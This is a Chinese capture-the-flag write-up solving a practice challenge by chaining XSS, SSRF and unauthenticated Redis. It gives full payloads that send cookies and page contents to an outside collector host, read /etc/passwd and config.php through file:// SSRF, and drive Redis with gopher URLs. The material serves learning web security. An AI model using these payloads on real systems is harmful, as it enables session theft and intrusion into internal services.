# XSS的威力：从XSS到SSRF再到Redis

阅读量 **568950**

|评论 **19**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-08-15 15:00:49

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01991a7c7c9a7de165.jpg)

## 前言

最近有空，想到曾经刷的

    
    
    [https://hackme.inndy.tw/scoreboard/
    ](https://hackme.inndy.tw/scoreboard/)

还有一组新题没做，于是看了一下，发现是xss->ssrf->redis的，觉得很有趣，于是做了一下，记录一下writeup  
以前的web题解可以看这篇文章

    
    
    [http://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/
    ](http://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/)

给出本次题目的链接

    
    
    [https://xssrf.hackme.inndy.tw/index.php
    ](https://xssrf.hackme.inndy.tw/index.php)

## xssme

首先是第一关，探查了一下功能，大概4项：

  * 注册
  * 登录
  * 发email
  * 看email

###  信息搜集

上来扫了波目录

    
    
    https://xssrf.hackme.inndy.tw/robots.txt
    

发现信息泄露

    
    
    User-agent: *
    Disallow: /config.php
    Disallow: /you/cant/read/config.php/can/you?
    Disallow: /backup.zip
    

下载压缩包后，发现有密码，猜想应该是要读config.php中的关键信息，才能获得压缩包密码

###  xss探测

于是回到主题，题目名称既然叫xssme，那么应该就是xss攻击了  
于是首先探测一下过滤  
发现测试的时候会直接告诉我们过滤的关键字，这样就更容易探测了  
既然`<Script`不行，那我们试试`<img>`  
发现同样不行，那么既然`onerror`不行，我再试试`onload`？

    
    
    <svg onload>
    

发现也不行，那我再变一下

    
    
    <svg/onload>
    

发现似乎没有被过滤，于是尝试payload

    
    
    <svg/onload="document.location='http://vps_ip:23333'">
    

发现收到信息  
  
于是开始构造payload打一波cookie

###  收获flag

payload如下:

    
    
    <svg/onload="document.location='http://ugelgr.ceye.io/?'+document.cookie">
    

解码后得到

    
    
    PHPSESSID=9crkuhdqs9b1jkslebpieprr86; FLAG_XSSME=FLAG{Sometimes, XSS can be critical vulnerability <script>alert(1)</script>}; FLAG_2=IN_THE_REDIS
    

于是愉快的获得了第一个flag

    
    
    FLAG{Sometimes, XSS can be critical vulnerability <script>alert(1)</script>}
    

并且获得提示，flag2在redis中

## xssrf leak

结合题目之前的暗示  
  
应该是要以admin身份登入吧，既然有PHPSESSID那我们试试吧  
很无奈的得到了这样的提示，必须从本地登录  
起初我认为需要修改http header，但是尝试了多种都发现不行，后来灵光一闪，一拍脑袋，是不是傻  
我们直接利用xss去本地访问，再将页面内容打出来就好了呀！  
于是思考到之前的思路

    
    
    <svg/onload>
    

构造出

    
    
    <svg/onload="document.location='http://ugelgr.ceye.io/?'+btoa(document.body.innerHTML)">
    

想去打页面内容  
但是发现了过滤  
现在没办法了，只能思考编码绕过了，于是尝试将

    
    
    document.location='http://ugelgr.ceye.io/?'+btoa(document.body.innerHTML)
    

进行编码

![](https://p3.ssl.qhimg.com/dm/1024_151_/t0185a443428c41210b.png)

尝试payload

![](https://p1.ssl.qhimg.com/dm/1024_184_/t01553de186f7b1c347.png)

发现成功收到消息

解码后保存到本地html里打开  
发现多了一个send request的功能，跟过去看代码  
没错，是多了一个request.php  
那么结合题目意思，应该是有ssrf，我想应该就是利用这里的request.php了吧  
那么继续去读这个页面的html

    
    
    <svg/onload="
    xmlhttp=new XMLHttpRequest();
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
        }
    }
    xmlhttp.open("GET","request.php",true);
    xmlhttp.send();
    ">
    

经过编码后发送，得到  
同样解码后发现代码  
应该xss的点就是在这里了  
于是尝试file协议读`/etc/passwd`

    
    
    <svg/onload="
    xmlhttp=new XMLHttpRequest();
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
        }
    }
    xmlhttp.open("POST","request.php",true);
    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlhttp.send("url=file:///etc/passwd");
    ">
    

发现成功读取了`/etc/passwd`  
那么我们回想到最初的文件

    
    
    User-agent: *
    Disallow: /config.php
    Disallow: /you/cant/read/config.php/can/you?
    Disallow: /backup.zip
    

于是直接读config.php

    
    
    <svg/onload="
    xmlhttp=new XMLHttpRequest();
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
        }
    }
    xmlhttp.open("POST","request.php",true);
    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlhttp.send("url=file:///var/www/html/config.php");
    ">
    

cool，于是我们拿到了第二个flag

    
    
    FLAG{curl -v -o flag --next flag://in-the.redis/the?port=25566&good=luck}
    

###  xssrf redis

只剩下最后一步打redis了  
这里很容易就想到了gopher未授权访问打redis  
上一题提示我们redis再25566端口，于是我们尝试访问一下

    
    
    <svg/onload="
    xmlhttp=new XMLHttpRequest();
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
        }
    }
    xmlhttp.open("POST","request.php",true);
    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlhttp.send("url=gopher://127.0.0.1:25566/_info%250a_quit");
    ">
    

于是愉快的打出信息，发现果然是未授权访问  
那么看看key有哪些

    
    
    xmlhttp.send("url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit");
    

发现了flag  
然后我们尝试读取

    
    
    xmlhttp.send("url=gopher://127.0.0.1:25566/_get%2520flag%250a_quit");
    

发现报错  
发现类型错误了  
那我们看看类型

    
    
    xmlhttp.send("url=gopher://127.0.0.1:25566/_type%2520flag%250a_quit");
    

发现是个list  
那我们看看长度

    
    
    xmlhttp.send("url=gopher://127.0.0.1:25566/_llen%2520flag%250a_quit");
    

发现是53  
那我们可以愉快的读取list了

    
    
    xmlhttp.send("url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit");
    

我们把它拼接起来

so cool  
得到最后的flag

    
    
    FLAG{Rediswithout authentication is easy to exploit}
    

## 后记

此题结束后，我对XSS的观点有了巨大的改变= =，实在是太强了

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **一叶飘零** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/156377](/post/id/156377)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [xss](/tag/xss)
  * [SSRF](/tag/SSRF)
  * [Web安全](/tag/Web安全)
  * [Redis](/tag/Redis)

 **+1** __31赞

 __收藏

![](https://p0.ssl.qhimg.com/t0115eb10739cb26739.png) 一叶飘零

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

